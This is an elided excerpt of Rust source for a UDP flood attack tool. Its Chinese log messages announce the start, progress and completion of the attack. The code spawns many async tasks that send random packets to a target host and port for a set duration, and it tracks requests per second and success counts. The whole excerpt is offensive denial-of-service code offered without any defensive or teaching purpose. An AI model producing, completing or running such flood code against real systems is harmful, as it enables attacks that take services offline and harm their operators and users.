...
pub async fn run_udp_attack(config: AttackConfig, stats: StatsArc) -> AttackResult {
    println!("🌊 UDP洪水攻击启动");
    ...
    // 调整参数
    let adjusted_connections = utils::adjust_connections_by_mode(config.connections, &config.mode, "udp");
    let (min_delay, max_delay) = utils::get_delay_by_mode(&config.mode, "udp");
    ...
    for _ in 0..adjusted_connections {
        ...
        let task = tokio::spawn(async move {
            ...
            while start.elapsed() < duration {
                ...
                // 生成随机数据包
                let packet = utils::generate_random_packet(packet_size);
                
                // 发送UDP包
                match socket.send_to(&packet, format!("{}:{}", target, port)) {
                    Ok(_) => {
    ...
    let monitor_task = tokio::spawn(async move {
        ...
        while start.elapsed() < duration {
            ...
            println!("⏱️ [{}s] UDP RPS: {:.0} | 成功: {} | 失败: {} | 总计: {}", 
                elapsed_seconds,
                rps, 
    ...
    let progress_task = tokio::spawn(async move {
        ...
        while elapsed < config.duration {
            sleep(Duration::from_secs(1)).await;
            elapsed += 1;
            println!("⏳ UDP攻击进度: {}/{} 秒", elapsed, config.duration);
        }
        println!("✅ UDP攻击完成！");
    });
